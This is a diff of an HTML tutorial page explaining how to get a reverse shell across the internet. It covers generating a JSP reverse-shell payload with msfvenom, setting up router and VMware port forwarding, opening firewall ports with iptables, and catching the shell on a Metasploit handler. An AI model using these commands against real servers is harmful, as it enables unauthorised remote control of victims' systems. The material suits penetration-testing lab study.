@@ -61,14 +61,14 @@
                             
                             The scenario is that the victim machine has downloaded a malicious file, and run it on his system. The malicious program will send the network packet back to the attacker machine. So those network packets must pass through the attacker's router or firewall. If the port used by the malicious program is not open on the attacker router, the program will never communicate with the attacker, so the attack won't be successful. <br>
                             <br>When simulating an attack on a local network, most of the time, the communication will never pass through the router so the meterpreter connection can be made and the attacker can open a reverse shell. <br>
-                            <br>Let's say we're going to create a malicious program with <strong>msfvenom</strong>, instead of providing our private address, we will provide our public address. So when the program will reverse the connection, the router has to know which machine is listening on that port and transfer the network packet to this machine. That's where <strong>port forwarding</strong> will be necessary. <br>
+                            <br>For this example, we're going to create a malicious program with <strong>msfvenom</strong>. Instead of providing our private address, we will provide our public address. So when the program will reverse the connection, the router has to know which machine is listening on that port and transfer the network packet to this machine. That's where <strong>port forwarding</strong> will be necessary. <br>
                             <img src="img/OpenForwardPort/portforward.jpeg" class="img-fluid" width="500">
 
-                            To find your public ip address you can check it on different websites such as <a href="https://www.whatismyip.com">whatismyip.com</a>, for your private address and the IP address of the router, it will depends on if you're on Linux of Windows.
+                            To find your public IP address you can check it on different websites such as <a href="https://www.whatismyip.com">whatismyip.com</a>. For your private address and the IP address of the router, it will depends on if you're on Linux of Windows.
 
                             <ul>
-                                <li>On Windows, a simple ipconfig /all will give enough information about your network.</li>
-                                <li>On Linux, <strong>ip addr</strong> is used to know your local IP address and <strong>route -n</strong> give you the IP address of your router</li>
+                                <li>On Windows, the command "<strong>ipconfig /all</strong>" will display some network information.</li>
+                                <li>On Linux, <strong>ip addr</strong> is used to know your local IP address and <strong>route -n</strong> displays the IP address of your router</li>
                             </ul>
                         </p>
                         <br>
@@ -80,7 +80,7 @@
                     <div class="flex-grow-1">
                         <h3 class="mb-0">2/ Creating a payload</h3>
                         <p>
-                            <strong>Msfvenom</strong> is a tool that you can get on a Kali Linux, it is an amazing tool that can generate a malicious payload. So we can create a payload to open a reverse shell when the process is running on a web server for example. <br>
+                            <strong>Msfvenom</strong> is a tool that you can get on Kali Linux, it is an amazing tool that can generate a malicious payload. So we can create a payload to open a reverse shell when the process is running on a web server for example. <br>
 
                             <br><strong><i>Msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your public IP address] LPORT=[Port to listen] -f raw > shell.jsp</i></strong><br>
                             <br>On this example, we are creating a malicious JSP payload and store it on a file called "shell.jsp".
@@ -93,11 +93,34 @@
                     <div class="flex-grow-1">
                         <h3 class="mb-0">3/ Port forwarding</h3>
                         <p>
-                            We have created our malicious file, but since that we won't be in the same network as the victim machine, we must modify some settings in our router. Port forwarding is to indicate to our router that we are going to open a specific port for a service and whenever there is a network packet for that specific port then the router must send the packet to an IP address.
-                            <img src="img/OpenForwardPort/router.png" class="img-fluid" width="700">
-                            Chose a port, it can be different from the one of the screenshot but make sure to always chose the same one so you don't have to do another <strong>port forwarding</strong> in your router. For the field "Server IP Address", enter your local IP address of your system and not your virtual machine even if you want to listen on that port with your virtual machine. <br>
+                            We have created our malicious file, but since that we won't be in the same network as the victim machine, we must modify some settings in our router. Port forwarding is to indicate to our router that we are going to open a specific port for a service and whenever there is a network packet for that specific port then the router must send the packet to this IP address.
+                            <img src="img/OpenForwardPort/router.png" class="img-fluid" width="600">
+                            Choose a port, it can be different from the one on the screenshot but make sure to always choose the same one so you don't have to do another <strong>port forwarding</strong> in your router. For the field "Server IP Address", enter your local IP address of your system and not your virtual machine even if open the connection with your virtual machine. <br>
                             <br>Now the router will forward every packet that has 4444 as destination port to the IP address 10.0.0.2 <br>
-                            Let's say now, our metasploit console is on our virtual machine, we must forward the packet I received from our local machine to our virtual machine. For this tutorial, I'll modify the configuration on VMware, if you're in another hypervisor, it should be almost the same.
+                            Our metasploit console is running on our virtual machine, we must forward the packet received by our local machine to our virtual machine. For this tutorial, I'll modify the network settings on VMware. <br>
+                            First step, set the network adapter to NAT, so that our local machine will act like a router for the virtual machine, and we are going to do another port forwarding from the local machine to the virtual machine.
+                            <img src="img/OpenForwardPort/vmwarenetwork.png" class="img-fluid" width="600">
+                            Then open the Virtual Network Editor (Edit -> Virtual Network Editor), select <strong>NAT settings</strong>, click on "<strong>add</strong>" under the section Port Forwarding and fill the information needed for the port forwarding.
+                            <img src="img/OpenForwardPort/vne.png" class="img-fluid" width="500">
+                            It will also be necessary to create a system firewall rule, otherwise the system firewall will block the inbound traffic, because the port is not open by default.
+                            <img src="img/OpenForwardPort/windowsfw.png" class="img-fluid" width="400">
+                            Select the <strong>port</strong> number and specify the <strong>protocols</strong> to open a reverse shell on the victim machine, then allow the connection. <br>
+                            If the traffic is still not passing through the VM, maybe the system firewall on your VM is also blocking the port. To open a port in the firewall, you can use the command below. Iptables enables to manage the rule in the Linux system.
+
+                            <br><ul>
+                                <li>sudo iptables -A INPUT -p tcp --dport [PORT_reverseShell] -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT</li>
+                                <li>sudo iptables -A OUTPUT -p tcp --sport [PORT_reverseShell] -m conntrack --ctstate ESTABLISHED -j ACCEPT</li>
+                            </ul>
+                            Once the settings and the upload on the web server are done, we can proceed to open a Metasploit session and grab the shell to remotely send command to the webserver. 
+                            <br>
+                            <br><strong>Sudo msfdb init & msfconsole start <br>
+                            msf > use exploit/multi/handler <br>
+                            msf exploit(handler)> set PAYLOAD java/jsp_shell_reverse_tcp <br>
+                            msf exploit(handler) > set LHOST 192.168.190.133  //YOUR VM ADDRESS <br>
+                            msf exploit(handler) > set LPORT 4444 //The port you have opened <br>
+                            msf exploit(handler) > exploit <br>
+                            </strong>
+                            <img src="img/OpenForwardPort/flag.png" class="img-fluid" width="500">
                         </p>
                     </div>
                 </div>
